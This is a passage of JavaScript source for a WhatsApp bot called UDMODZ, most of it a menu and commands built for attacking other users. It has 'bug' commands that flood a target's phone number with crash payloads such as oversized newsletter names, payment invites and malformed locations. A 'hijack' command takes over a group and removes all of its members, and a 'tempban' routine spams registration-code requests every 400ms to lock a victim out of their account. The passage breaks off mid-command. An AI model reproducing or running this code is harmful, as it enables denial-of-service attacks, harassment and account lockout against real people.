udmodz.sendMessage(m.chat, { react: { text: '🕒', key: m.key }})
let kyuu = await fetchJson (`https://api.kyuurzy.site/api/download/aio?query=${link}`)
udmodz.sendMessage(m.chat, { audio: {url: kyuu.result.url}, mimetype: "audio/mpeg"},{ quoted:m})
}catch (err) {
reply(`${err}`)
}
}

async function downloadMp4 (link) {
try {
udmodz.sendMessage(m.chat, { react: { text: '🕒', key: m.key }})
let kyuu = await fetchJson(`https://api.kyuurzy.site/api/download/aio?query=${link}`)
udmodz.sendMessage(m.chat, { video: {url: kyuu.result.url}, caption: '' },{ quoted:m})
}catch (err) {
reply(`${err}`)
}
}

//self public
global.public = true
if (!global.public) {
if (!m.key.fromMe && !isCreator) return
}

const reply = (teks) => { 
udmodz.sendMessage(from, { text: teks, contextInfo: {
mentionedJid: [m.sender],
externalAdReply: {
showAdAttribution: false,
renderLargerThumbnail: false,
title: `UDMODZ`,
body: `Hi ${pushname} 👋`,
previewType: "VIDEO",
thumbnail: anjay,
sourceUrl: `https://youtube.com/@UDMODZ`,
mediaUrl: `https://youtube.com/@UDMODZ`
}
},
text: teks
}, {
quoted: m
})
}

const reply2 = (teks) => {
udmodz.sendMessage(from, { text : teks }, { quoted : m })
}


function getFormattedDate() {
  var currentDate = new Date();
  var day = currentDate.getDate();
  var month = currentDate.getMonth() + 1;
  var year = currentDate.getFullYear();
  var hours = currentDate.getHours();
  var minutes = currentDate.getMinutes();
  var seconds = currentDate.getSeconds();
}

let d = new Date(new Date + 3600000)
let locale = 'id'
let week = d.toLocaleDateString(locale, { weekday: 'long' })
let date = d.toLocaleDateString(locale, {
  day: 'numeric',
  month: 'long',
  year: 'numeric'
})
const hariini = d.toLocaleDateString('id', { day: 'numeric', month: 'long', year: 'numeric' })

function msToTime(duration) {
var milliseconds = parseInt((duration % 1000) / 100),
seconds = Math.floor((duration / 1000) % 60),
minutes = Math.floor((duration / (1000 * 60)) % 60),
hours = Math.floor((duration / (1000 * 60 * 60)) % 24)

hours = (hours < 10) ? "0" + hours : hours
minutes = (minutes < 10) ? "0" + minutes : minutes
seconds = (seconds < 10) ? "0" + seconds : seconds
return hours + " jam " + minutes + " menit " + seconds + " detik"
}

function msToDate(ms) {
		temp = ms
		days = Math.floor(ms / (24*60*60*1000));
		daysms = ms % (24*60*60*1000);
		hours = Math.floor((daysms)/(60*60*1000));
		hoursms = ms % (60*60*1000);
		minutes = Math.floor((hoursms)/(60*1000));
		minutesms = ms % (60*1000);
		sec = Math.floor((minutesms)/(1000));
		return days+" Hari "+hours+" Jam "+ minutes + " Menit";
		// +minutes+":"+sec;
  }

// Sayying time
const timee = moment().tz('Asia/Colombo').format('HH:mm:ss')

var waktuucapan = 'Hi! 😎Welcome To UDMODZ'



if (prefix && command) {
let caseNames = getCaseNames();
function getCaseNames() {
const fs = require('fs');
try {
const data = fs.readFileSync('case.js', 'utf8');
const casePattern = /case\s+'([^']+)'/g;
const matches = data.match(casePattern);
if (matches) {
const caseNames = matches.map(match => match.replace(/case\s+'([^']+)'/, '$1'));
return caseNames;
} else {
return [];
} } catch (err) {
console.log('Terjadi kesalahan:', err);
return [];
}}
let noPrefix = command
let mean = didyoumean(noPrefix, caseNames);
let sim = similarity(noPrefix, mean);
let similarityPercentage = parseInt(sim * 100);
if (mean && noPrefix.toLowerCase() !== mean.toLowerCase()) {
let response = `Maaf, command yang kamu berikan salah. mungkin ini yang kamu maksud:\n\n•> ${prefix+mean}\n•> Kemiripan: ${similarityPercentage}%`
reply(response)
}}

switch(command) {

case 'alive': case 'Hi': case 'help': {

let imgsc = await prepareWAMessageMedia({
image: anjay
}, {
upload: udmodz.waUploadToServer
})
let anu = `┏─╴[ \`𝗨𝗗𝗕𝗢𝗧𝘇\` ] ──┓
│ 𝗛i *${pushname}*
│ *${timee}*
│ *${hariini}*
│ *${waktuucapan}*
│            [ \`𝗜𝗡𝗙𝗢 𝗕𝗢𝗧\` ]
│ 𝐎𝐰𝐧𝐞𝐫 : ${global.namaown}
│ 𝐁𝐨𝐭 : ${global.namabot}
│ 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 : ${global.versisc}
┗──────────────────┛
𝗧𝗬𝗣𝗘 menu 𝘁𝗼 𝗴𝗲𝘁 𝗺𝗲𝗻𝘂
Note:-Bot's speed depend on 
your phones ram and processor`
const msg = generateWAMessageFromContent(m.chat, {
viewOnceMessage: {
message: {
interactiveMessage: {
header: {
...imgsc,
hasMediaAttachment: false
},
body: {
text: anu
},
footer: {
text: ""
},
}
}
}
}, {quoted:zyn})
await udmodz.relayMessage(m.chat, msg.message, {
messageId: msg.key.id
})
await sleep(500)
 }
break

case 'menu': {

let imgsc = await prepareWAMessageMedia({
image: anjay
}, {
upload: udmodz.waUploadToServer
})
let anu = `┏─╴[ \`𝗨𝗗𝗕𝗢𝗧𝘇\` ] ──┓
│ 𝗛𝗜 *${pushname}*
│ *${timee}*
│ *${hariini}*
│ *${waktuucapan}*
│            [ \`𝗜𝗡𝗙𝗢 𝗕𝗢𝗧\` ]
│ 𝐎𝐰𝐧𝐞𝐫 : ${global.namaown}
│ 𝐁𝐨𝐭 : ${global.namabot}
┗──────────────────┛
┏──⟬ \`𝗖𝗛𝗔𝗧 𝗕𝗨𝗚\` ⟭
││${global.simbol} ʙᴜɢ *<number>*
││${global.simbol} 👾 *<number>*
││${global.simbol} 𝚇2 *<number>*
││${global.simbol} 𝚡 *<number>*
││${global.simbol} 𝚡𝚛𝚎𝚊𝚌𝚝 *<number>*
││${global.simbol} 𝚒𝚘𝚜ʙᴜɢ2 *<number>*
││${global.simbol} 𝚒𝚘𝚜ʙᴜɢ2 *<number>*
││${global.simbol} 𝚡𝚊𝚞𝚍𝚒𝚘 *<number>*
││${global.simbol} 𝚡𝚊𝚞𝚍𝚒𝚘2 *<number>*
││${global.simbol} 𝚡𝚜𝚝𝚒𝚌𝚔𝚎𝚛 *<number>*
││${global.simbol} 𝚡𝚜𝚝𝚒𝚌𝚔𝚎𝚛2 *<number>*
││${global.simbol} 𝚡𝚕𝚘𝚌2 *<number>*
││${global.simbol} 𝚡𝚕𝚘𝚌 *<number>*
││${global.simbol} 𝚡𝚕𝚒𝚜𝚝 *<number>*
││${global.simbol} 𝚡𝚕𝚒𝚜𝚝2 *<number>*
││${global.simbol} 𝚒𝚘𝚜𝚚 *<number>*
││${global.simbol} 𝚒𝚘𝚜𝚐𝚘𝚘𝚐𝚕𝚎 *<number>*
││${global.simbol} 𝚒𝚘𝚜𝚐𝚘𝚘𝚐𝚕𝚎2 *<number>*
││${global.simbol} 𝚡𝚒𝚘𝚜𝚌𝚛𝚊𝚜𝚑 *<number>*
││${global.simbol} 𝚡𝚒𝚘𝚜𝚌𝚛𝚊𝚜𝚑2 *<number>*
││${global.simbol} 𝚡𝚌𝚛𝚊𝚜𝚑 *<number>*
││${global.simbol} 𝚡𝚌𝚛𝚊𝚜𝚑2 *<number>*
││${global.simbol} 𝚙𝚖𝚋𝚞𝚐 *<number>*
││${global.simbol} 𝚍𝚎𝚕𝚊𝚢𝚋𝚞𝚐 *<number>*
││${global.simbol} 𝚍𝚘𝚌𝚞𝚋𝚞𝚐 *<number>*
││${global.simbol} 𝚞𝚗𝚕𝚒𝚖𝚒𝚝𝚎𝚍𝚋𝚞𝚐 *<number>*
││${global.simbol} 𝚋𝚘𝚖𝚋𝚞𝚐 *<number>*
││${global.simbol} 𝚕𝚊𝚐𝚋𝚞𝚐 *<number>*
││${global.simbol} 𝚝𝚛𝚘𝚕𝚕𝚢𝚋𝚞𝚐 *<number>*
││  
││  ⟬ \`𝗚𝗥𝗢𝗨𝗣 𝗕𝗨𝗚\` ⟭
││  
││${global.simbol} 𝚐𝚌𝚋𝚞𝚐 *<group link>*
││${global.simbol} 𝚍𝚎𝚕𝚊𝚢𝚐𝚌𝚋𝚞𝚐 *<group link>*
││${global.simbol} 𝚕𝚊𝚐𝚐𝚌𝚋𝚞𝚐 *<group link>*
││${global.simbol} 𝚋𝚘𝚖𝚐𝚌𝚋𝚞𝚐 *<group link>*
││${global.simbol} 𝚞𝚗𝚕𝚒𝚖𝚒𝚝𝚎𝚍𝚐𝚌𝚋𝚞𝚐 *<group link>*
││${global.simbol} 𝚝𝚛𝚘𝚕𝚕𝚢𝚐𝚌𝚋𝚞𝚐 *<group link>*
││${global.simbol} 𝚍𝚘𝚌𝚞𝚐𝚌𝚋𝚞𝚐 *<group link>*
││
││  ⟬ \`𝗞𝗜𝗖𝗞 𝗔𝗟𝗟𝗠𝗘𝗠\` ⟭
││${global.simbol} ʜɪᴊᴀᴄᴋ *<group>*
││
││  ⟬ \`𝗦𝗧𝗢𝗥𝗘 𝗠𝗘𝗡𝗨\` ⟭
││${global.simbol} ᴏᴡɴᴇʀ
││${global.simbol} ʟɪsᴛ
││
││  ⟬ \`𝗟𝗢𝗚𝗜𝗡 𝗕𝗨𝗚\` ⟭
││${global.simbol} ᴛᴇᴍᴘʙᴀɴ
││ 
││  ⟬ \`𝗦𝗘𝗧𝗧𝗜𝗡𝗚\` ⟭
││${global.simbol} sᴇʟғ
││${global.simbol} ᴘᴜʙʟɪᴄ
││${global.simbol} restart
┗────────────────┛

Note:-Bot's speed depend on 
your phones ram and processor`
const msg = generateWAMessageFromContent(m.chat, {
viewOnceMessage: {
message: {
interactiveMessage: {
header: {
...imgsc,
hasMediaAttachment: false
},
body: {
text: anu
},
footer: {
text: ""
},
}
}
}
}, {quoted:zyn})
await udmodz.relayMessage(m.chat, msg.message, {
messageId: msg.key.id
})
await sleep(500)
 }
break

case 'hijack': {
if (!isCreator) return reply(OnlyOwner)
if (!isGroup) return reply(`Khusus Dalam Group Bego`)
if (!isAdmins && !isCreator) return udmodz.sendMessage('Khusus Admin')
if (!isBotAdmins) return udmodz.sendMessage(`Bot Bukan Admin Bego`)
await udmodz.groupUpdateSubject(m.chat, ' 𝗨𝗗𝗕𝗢𝗧𝘇')
await udmodz.groupUpdateDescription(m.chat, '𝗨𝗗𝗕𝗢𝗧𝘇')
let data = participants.map((x) => x.id)
for (let x of data) {
if (x !== botNumber && x !== groupMetadata.owner && x !== kontributor + "@s.whatsapp.net") {
await udmodz.groupParticipantsUpdate(m.chat, [x], "remove")
}}}
break

case 'bug2': {
if (!isCreator) return reply(mess.OnlyOwner)
if (!text) return reply(`Example: .${command} 628xxx`)
let peler = q.replace(/[^0-9]/g, "")
if (peler.startsWith('0')) return reply(`\`[ # ]\` Masukan Nomor Awal Kode Negara\n\n\`[ # ]\` Example : .${command} 628xxx`)
let Pe = peler + '@s.whatsapp.net'
await reply(mess.bugrespon)
for (let j = 0; j < 5; j++) {
await sendPaymentInfoMessage(Pe, force2)
await bakdok(Pe, zynxzobug)
await sendPaymentInfoMessage(Pe, zynxzobug)
await sendPaymentInfoMessage(Pe, force2)
await bakdok(Pe, zynxzobug)
await sendPaymentInfoMessage(Pe, zynxzobug)
await penghitaman(Pe, zynbug)
await sendPaymentInfoMessage(Pe, zpay)
await iponcrash(Pe, force)
await sendPaymentInfoMessage(Pe, zynbug)
await sendSystemCrashMessage(Pe, force)
await sendPaymentInfoMessage(Pe, zynxzobug)
await iponcrash(Pe, zynxzobug)
await sendPaymentInfoMessage(Pe, force)
await penghitaman(Pe, zynbug)
await sendPaymentInfoMessage(Pe, zynxzobug)
await sendPaymentInfoMessage(Pe, zpay)
await ngeloc(Pe, force)
await sendPaymentInfoMessage(Pe, zpay)
await bakdok(Pe, zynxzobug)
await sendPaymentInfoMessage(Pe, force2)
await penghitaman(Pe, zynbug)
await sendPaymentInfoMessage(Pe, force)
await sendPaymentInfoMessage(Pe, zynbug)
await ngeloc(Pe, force2)
udmodz.sendMessage(Pe, {text: `\`𝘔𝘢𝘳𝘬 𝘈𝘮𝘱𝘢𝘴\``}, {quoted: m})
udmodz.sendMessage(Pe, {text: `\`𝘔𝘢𝘳𝘬 𝘈𝘮𝘱𝘢𝘴\``}, {quoted: m})
udmodz.sendMessage(Pe, {text: `\`𝘔𝘢𝘳𝘬 𝘈𝘮𝘱𝘢𝘴\``}, {quoted: m})
udmodz.sendMessage(Pe, {text: `\`𝘔𝘢𝘳𝘬 𝘈𝘮𝘱𝘢𝘴\``}, {quoted: m})
await sendPaymentInfoMessage(Pe)
await sendPaymentInfoMessage(Pe, force2)
await bakdok(Pe, zynxzobug)
await sendPaymentInfoMessage(Pe, zynxzobug)
}
await reply(mess.donebug)
}
break

case 'bug': {
if (!isCreator) return reply(mess.OnlyOwner)
if (!text) return reply(`Example: .${command} 628xxx`)
let peler = q.replace(/[^0-9]/g, "")
if (peler.startsWith('0')) return reply(`\`[ # ]\` Masukan Nomor Awal Kode Negara\n\n\`[ # ]\` Example : .${command} 628xxx`)
let Pe = peler + '@s.whatsapp.net'
await reply(mess.bugrespon)
for (let j = 0; j < 5; j++) {
await sendPaymentInfoMessage(Pe)
await bakdok(Pe, zynxzobug)
await sendPaymentInfoMessage(Pe)
await sendPaymentInfoMessage(Pe, force2)
await bakdok(Pe, zynxzobug)
await sendPaymentInfoMessage(Pe, zynxzobug)
await penghitaman(Pe, zynbug)
await sendPaymentInfoMessage(Pe, zpay)
await iponcrash(Pe, force)
await sendPaymentInfoMessage(Pe, zynbug)
await sendSystemCrashMessage(Pe, force)
await sendPaymentInfoMessage(Pe)
await iponcrash(Pe, zynxzobug)
await sendPaymentInfoMessage(Pe, force)
await penghitaman(Pe, zynbug)
await sendPaymentInfoMessage(Pe, zynxzobug)
await sendPaymentInfoMessage(Pe, zpay)
await ngeloc(Pe, force)
await sendPaymentInfoMessage(Pe, zpay)
await bakdok(Pe, zynxzobug)
await sendPaymentInfoMessage(Pe, force2)
await penghitaman(Pe, zynbug)
await sendPaymentInfoMessage(Pe, force)
await sendPaymentInfoMessage(Pe, zynbug)
await ngeloc(Pe, force2)
udmodz.sendMessage(Pe, {text: `\`𝘊𝘳𝘢𝘴𝘩 𖢗\``}, {quoted: m})
udmodz.sendMessage(Pe, {text: `\`𝘊𝘳𝘢𝘴𝘩 𖢗\``}, {quoted: m})
udmodz.sendMessage(Pe, {text: `\`𝘊𝘳𝘢𝘴𝘩 𖢗\``}, {quoted: m})
udmodz.sendMessage(Pe, {text: `\`𝘊𝘳𝘢𝘴𝘩 𖢗\``}, {quoted: m})
await sendPaymentInfoMessage(Pe, force2)
await bakdok(Pe, zynxzobug)
await sendPaymentInfoMessage(Pe, zynxzobug)
await sendPaymentInfoMessage(Pe, force2)
await bakdok(Pe, zynxzobug)
await sendPaymentInfoMessage(Pe, zynxzobug)
}
await reply(mess.donebug)
}
break

case '👾': {
if (!isCreator) return reply(mess.OnlyOwner)
if (!text) return reply(`Example: .${command} 94xxx`)
let peler = q.replace(/[^0-9]/g, "")
if (peler.startsWith('0')) return reply(`\`[ # ]\` Masukan Nomor Awal Kode Negara\n\n\`[ # ]\` Example : .${command} 94xxx`)
let Pe = peler + '@s.whatsapp.net'
await reply(mess.bugrespon)
for (let j = 0; j < 5; j++) {
await sendPaymentInfoMessage(Pe)
await bakdok(Pe, zynxzobug)
await sendPaymentInfoMessage(Pe)
await sendPaymentInfoMessage(Pe, force2)
await bakdok(Pe, zynxzobug)
await sendPaymentInfoMessage(Pe, zynxzobug)
await sendPaymentInfoMessage(Pe, zynbug)
await ngeloc(Pe, force2)
await sendPaymentInfoMessage(Pe, force2)
await bakdok(Pe, zynxzobug)
await sendPaymentInfoMessage(Pe, zynxzobug)
await sendPaymentInfoMessage(Pe, force2)
await bakdok(Pe, zynxzobug)
await sendPaymentInfoMessage(Pe, zynxzobug)
await sendPaymentInfoMessage(Pe, zynbug)
await ngeloc(Pe, force2)
udmodz.sendMessage(Pe, {text: `\`𝘈𝘸𝘰𝘬 𝘈𝘸𝘰𝘬 𝗖𝟭\``}, {quoted: m})
udmodz.sendMessage(Pe, {text: `\`𝘈𝘸𝘰𝘬 𝘈𝘸𝘰𝘬 𝗖𝟭\``}, {quoted: m})
udmodz.sendMessage(Pe, {text: `\`𝘈𝘸𝘰𝘬 𝘈𝘸𝘰𝘬 𝗖𝟭\``}, {quoted: m})
udmodz.sendMessage(Pe, {text: `\`𝘈𝘸𝘰𝘬 𝘈𝘸𝘰𝘬 𝗖𝟭\``}, {quoted: m})
await sendPaymentInfoMessage(Pe, force2)
await bakdok(Pe, zynxzobug)
await sendPaymentInfoMessage(Pe, zynxzobug)
await sendPaymentInfoMessage(Pe, force2)
await bakdok(Pe, zynxzobug)
await sendPaymentInfoMessage(Pe, zynxzobug)
}
await reply(mess.donebug)
}
break

case 'tempban': {
if (!isCreator) return reply(mess.OnlyOwner)
if (!text) return reply(`Example: ${prefix + command} 94|8xxx`)
if (!/|/.test(text)) return reply(`Kek gini tolol \n ${prefix + command} 94|xxxxx`)
let numbers = JSON.parse(fs.readFileSync('./lib/tempban/ban.json'))
let cCode = q.split("|")[0]
let number = q.split("|")[1]
let fullNo = cCode + number
await reply(`Success! Registration Interruption has been successfully activated to the target : ${fullNo} for an unlimited period of time. Registration interruption will be stopped if the server is restarted, shut down, or down.`)
let { state } = await useMultiFileAuthState('tempban')
let spam = makeWASocket({
auth: state,
mobile: true,
logger: pino({ level: 'silent' })
})
let dropNumber = async () => {
try {
let res = await spam.requestRegistrationCode({
phoneNumber: '+' + fullNo,
phoneNumberCountryCode: cCode,
phoneNumberNationalNumber: number,
phoneNumberMobileCountryCode: 724,
})
if (res.reason === 'temporarily_unavailable') {
console.log(`Invalid Number (Possibility of Interrupted Registration): +${res.login}`)
await sleep(100)
await dropNumber()
}
} catch (error) {
}
}
numbers[fullNo] = { cCode, number };
fs.writeFileSync('./lib/tempban/ban.json', JSON.stringify(numbers, null, '\t'))
setInterval(() => {
dropNumber()
}, 400)
}
break


case 'restart':
if (!isCreator) return reply(mess.OnlyOwner)
reply(`Restart server...`)
await sleep(3000)
process.exit()
break 
case 'public': {
if (!isCreator) return reply(mess.OnlyOwner)
global.public = true
reply('Succes Change To Public Mode')
}
break


/*

𝗘𝗫𝗧𝗥𝗔𝗖𝗧𝗘𝗗 𝗕𝗬 𝗨𝗗𝗠𝗢𝗗𝗭 (𝗨𝗗𝗛𝗔𝗡𝗜𝗞𝗔 𝗗𝗜𝗦𝗦𝗔𝗡𝗔𝗬𝗔𝗞𝗔)
𝗥𝗘𝗠𝗘𝗠𝗕𝗘𝗥 𝗜𝗡 𝗖𝗥𝗘𝗗𝗜𝗧𝗦 😇
✅
*/

//bug functions
const subscribe_udmodder = {
"key": { 
"fromMe": false,
"participant": '0@s.whatsapp.net',
"remoteJid": 'status@broadcast' 
},
message: {
"listResponseMessage": {
title: `UDMODZ`
}}
}
async function UDMODZcrash(udmodder,chat) {
udmodz.sendMessage(chat, {
document: {url: './settings.js'},
mimetype: `image/null`,
fileName: `${udmodder}.${udmodztext1}` ,
caption: `${udmodder + udmodztext1}`,
}, {quoted: subscribe_udmodder })
}
//end bug functions



//bug database
const { udmodztext1 } = require('./lib/udmodztext1')
const { udmodztext2 } = require('./lib/udmodztext2')
const { udmodztext3 } = require('./lib/udmodztext3')
const { udmodztext4 } = require('./lib/udmodztext4')
const { udmodztext5 } = require('./lib/udmodztext5')
const { udmodztext6 } = require('./lib/udmodztext6')
const wkwk = fs.readFileSync(`./lib/x.mp3`)
const xsteek = fs.readFileSync(`./lib/x.webp`)
                          
            //bug && war cases 
//⚠️do not edit cases otherwise bug not work
//bug cases 
case 'clearchat':
reply('\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n')
break
case 'xreact': {
if (!isPremium) return reply(mess.prem)
if (!m.quoted) return reply(`Example usage: ${prefix + command} reply chat`)
await udmodz.sendMessage(m.chat, { text: 'Success In Sending Bug', contextInfo:{ isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: '120363183696686259@newsletter', newsletterName: `${ownername}`.repeat(10000), serverMessageId: 2 } }}, { quoted: xbug2 })
await sleep(2000)
await udmodz.sendMessage(m.chat, { react: { text: '🦄', key: { remoteJid: m.chat, fromMe: true, id: quoted.id } } })
}
break
case 'x2': {
if (!isPremium) return reply(mess.prem)
if (!args[0]) return reply(`Use ${prefix+command} amount\nExample ${prefix+command} 5`) 
amount = text * 30
for (let i = 0; i < amount; i++) {
await udmodz.sendMessage(m.chat, { text: ownername, contextInfo:{ isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: '120363183696686259@newsletter', newsletterName: botname.repeat(10000), serverMessageId: 2 } }}, { quoted: xbug2 })
}
}
break
case 'x': {
if (!isPremium) return reply(mess.prem)
if (!args[0]) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 947XXXXXXXX`) 
await loading()
victim = text.split("|")[0]+"@s.whatsapp.net"
amount = text.split("|")[1] * 30
for (let i = 0; i < amount; i++) {
await udmodz.sendMessage(victim, { text: ownername, contextInfo:{ isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: '120363183696686259@newsletter', newsletterName: botname.repeat(10000), serverMessageId: 2 } }}, { quoted: xbug2 })
}
reply(`Successfully Sent Bug To ${victim}`)
}
break
case 'iosbug2': {
if (!isPremium) return reply(mess.prem)
if (!text) return reply(`Example usage: ${prefix + command} 5`)
amount = text * 30
for (let i = 0; i < amount; i++) {
await udmodz.relayMessage(m.chat, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
await sleep(1400)
}
}
break
case 'iosbug': {
if (!isPremium) return reply(mess.prem)
if (!text) return reply(`Example:\n ${prefix + command} 947XXXXXXXX`)
await loading()
victim = text.split("|")[0]+"@s.whatsapp.net"
amount = text.split("|")[1] * 30
for (let i = 0; i < amount; i++) {
await udmodz.relayMessage(victim, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
await sleep(1400)
}
reply(`Successfully Sent Bug To ${victim}`)
}
break
case 'xaudio2': {
if (!isPremium) return reply(mess.prem)
if (!text) return reply(`Example usage: ${prefix + command} 5`)
amount = text * 30
for (let i = 0; i < amount; i++) {
await udmodz.sendMessage(m.chat, { "caption": `${ownername}`, audio: wkwk, mimetype: 'audio/mpeg', ptt:false,"title":`p`,"contextInfo": {"forwardingScore": 99999999,"isForwarded": true,forwardedNewsletterMessageInfo: { newsletterJid: '120363144038483540@newsletter', newsletterName: botname.repeat(10000),serverMessageId: 2 }}},{quoted: xbug2 })
}
}
break
case 'xaudio': {
if (!isPremium) return reply(mess.prem)
if (!text) return reply(`Example usage:\n ${prefix + command} 947XXXXXXXX`)
await loading()
victim = text.split("|")[0]+"@s.whatsapp.net"
amount = text.split("|")[1] * 30
for (let i = 0; i < amount; i++) {
await udmodz.sendMessage(victim, { "caption": `${ownername}`, audio: wkwk, mimetype: 'audio/mpeg', ptt:false,"title":`p`,"contextInfo": {"forwardingScore": 99999999,"isForwarded": true,forwardedNewsletterMessageInfo: { newsletterJid: '120363144038483540@newsletter', newsletterName: botname.repeat(10000),serverMessageId: 2 }}},{quoted: xbug2 })
}
reply(`Successfully Sent Bug To ${victim}`)
}
break
case 'xsticker': {
if (!isPremium) return reply(mess.prem)
if (!text) return reply(`Example: ${prefix + command} 947XXXXXXXX`)
await loading()
victim = text.split("|")[0]+"@s.whatsapp.net"
amount = text.split("|")[1] * 30
for (let i = 0; i < amount; i++) {
await udmodz.sendVideoAsSticker(victim, xsteek, xbug2, { packname: packname, author: author })
}
reply(`Successfully Sent Bug To ${victim}`)
}
break
case 'xsticker2': {
if (!isPremium) return reply(mess.prem)
if (!text) return reply(`Example: ${prefix + command} 5`)
amount = text * 2
for (let i = 0; i < amount; i++) {
await udmodz.sendVideoAsSticker(m.chat, xsteek, xbug2, { packname: packname, author: author })
}
}
break
case 'xloc2': {
if (!isPremium) return reply(mess.prem)
if (!text) return reply(`Example: ${prefix + command} 5`)
amount = text
udhanikaopr = ownername.repeat(0)
for (let i = 0; i < amount; i++) {
udmodz.sendMessage(from, { location: { degreesLatitude: 173.282, degreesLongitude: -19.378, name: botname, address: ownername, url: `https://${udhanikaopr}.com`, comment: botname, jpegThumbnail: null } }, { quoted: xbug2 })
}
}
break
case 'xloc': {
if (!isPremium) return reply(mess.prem)
if (!text) return reply(`Example: ${prefix + command} 947XXXXXXXX`)
await loading()
victim = text.split("|")[0]+"@s.whatsapp.net"
amount = text.split("|")[1] * 30
udhanikaopr = ownername.repeat(0)
for (let i = 0; i < amount; i++) {
udmodz.sendMessage(victim, { location: { degreesLatitude: 173.282, degreesLongitude: -19.378, name: botname, address: ownername, url: `https://${udhanikaopr}.com`, comment: botname, jpegThumbnail: null } }, { quoted: xbug2 })
}
reply(`Successfully Sent Bug To ${victim}`)
}
break
case 'xlist': {
if (!isPremium) return reply(mess.prem)
if (!text) return reply(`Example:\n${prefix + command} 947XXXXXXXX`)
victim = text.split("|")[0]+"@s.whatsapp.net"
amount = text.split("|")[1] * 30
for (let i = 0; i < amount; i++) {
await udmodz.sendMessage(victim, { text: '' }, { quoted: xbug2 })
}
reply(`Successfully Sent Bug To ${victim}`)
}
break
case 'xlist2': {
if (!isPremium) return reply(mess.prem)
if (!text) return reply(`Example:\n${prefix + command} 5`)
amount = text * 30
for (let i = 0; i < amount; i++) {
await udmodz.sendMessage(from, { text: '' }, { quoted: xbug2 })
}
}
break
case 'tempban': {
if (!isPremium) return reply(mess.prem)
if (!text) return reply(`Example: ${prefix + command} 91|6909137211`)
if (!/|/.test(text)) return reply(`The data you provided is invalid!, Example: \n ${prefix + command} 91|6909137211`)
let numbers = JSON.parse(fs.readFileSync('./lib/tempban.json'))
let cCode = q.split("|")[0]
let number = q.split("|")[1]
let fullNo = cCode + number
await reply(`Kesuksesan! Gangguan Pendaftaran telah berhasil diaktifkan ke target : ${fullNo} untuk jangka waktu tidak terbatas. Gangguan registrasi akan dihentikan jika server di-restart, ditutup`)
let { state, saveCreds } = await useMultiFileAuthState('session')
let spam = makeWaSocket({
auth: state,
mobile: true,
logger: pino({ level: 'silent' })
})
let dropNumber = async () => {
try {
let res = await spam.requestRegistrationCode({
phoneNumber: `+${fullNo}`,
phoneNumberCountryCode: cCode,
phoneNumberNationalNumber: number,
phoneNumberMobileCountryCode: 724,
})
if (res.reason === 'temporarily_unavailable') {
console.log(`Nomor Tidak Valid (Kemungkinan Registrasi Terganggu): +${res.login}`)
await sleep(1000)
await dropNumber()
}
} catch (error) {
console.error(error)
}
}
numbers[fullNo] = { cCode, number };
fs.writeFileSync('./lib/tempban.json', JSON.stringify(numbers, null, '\t'))
setInterval(() => {
dropNumber()
}, 400)
}
break
case 'iosq':{
if (!isPremium) return reply(mess.prem)
if (!args[0]) return reply(`Use ${prefix+command} number\nExample ${prefix+command} 91xxxxxxxxxx`)
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "50"
for (let i = 0; i < amount; i++) {
udmodz.relayMessage(from,{
extendedTextMessage:{
"text":'.',
"contextInfo": {
"stanzaId": victim,
"participant": victim,
"quotedMessage": {
"conversation": udmodztext1
},
"disappearingMode": {
"initiator": "CHANGED_IN_CHAT",
"trigger": "CHAT_SETTING"
}
},
"inviteLinkGroupTypeV2": "DEFAULT"
}
},{messageId: null})
}
reply(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
}
break
case 'iosgoogle': {
if (!isPremium) return reply(mess.prem)
if (!args[0]) return reply(`Use ${prefix+command} number\nExample ${prefix+command} 91xxxxxxxxxx`)
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "50"
for (let i = 0; i < amount; i++) {
udmodz.sendMessage(victim,{
text: `https://google.com`,
contextInfo: {
externalAdReply: {
renderLargerThumbnail: true,
mediaType: 1,
title: udmodztext6,
body: `###############################`,
thumbnail: await getBuffer('https://logopng.com.br/logos/google-37.svg'),
jpegThumbnail: await getBuffer('https://logopng.com.br/logos/google-37.svg'),
previewType: "NONE",
sourceUrl: link,
}}
})
}
reply(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
}
break
case 'iosgoogle2': {
if (!isPremium) return reply(mess.prem)
if (!args[0]) return reply(`Use ${prefix+command} amount\nExample ${prefix+command} 5`)
amount = `${encodeURI(text)}`
for (let i = 0; i < amount; i++) {
udmodz.sendMessage(m.chat,{
text: `https://google.com`,
contextInfo: {
externalAdReply: {
renderLargerThumbnail: true,
mediaType: 1,
title: udmodztext6,
body: `###############################`,
thumbnail: await getBuffer('https://logopng.com.br/logos/google-37.svg'),
jpegThumbnail: await getBuffer('https://logopng.com.br/logos/google-37.svg'),
previewType: "NONE",
sourceUrl: link,
}}
})
}
reply(`*Successfully sent as many bugs as ${amount} Please pause for 3 minutes*`)
}
break
case 'xioscrash':
if (!isPremium) return reply(mess.prem)
if (!args[0]) return reply(`Use ${prefix+command} number\nExample ${prefix+command} 91xxxxxxxxxx`)
 victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "50"
for (let i = 0; i < amount; i++) {
udmodz.relayMessage(victim,{ 
"paymentInviteMessage": {
serviceType: "UPI",
expiryTimestamp: Date.now() + (24 * 60 * 60 * 1000) 
}},{})
await sleep(3000)
}
reply(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
break
case 'xioscrash2':{
if (!isPremium) return reply(mess.prem)
if (!args[0]) return reply(`Use ${prefix+command} amount\nExample ${prefix+command} 5`)
 amount = `${encodeURI(text)}`
for (let i = 0; i < amount; i++) {
udmodz.relayMessage(m.chat,{ 
"paymentInviteMessage": {
serviceType: "UPI",
expiryTimestamp: Date.now() + (24 * 60 * 60 * 1000) 
}},{})
await sleep(3000)
}
reply(`*Successfully sent as many bugs as ${amount} Please pause for 3 minutes*`)
}
break
case 'xcrash':{
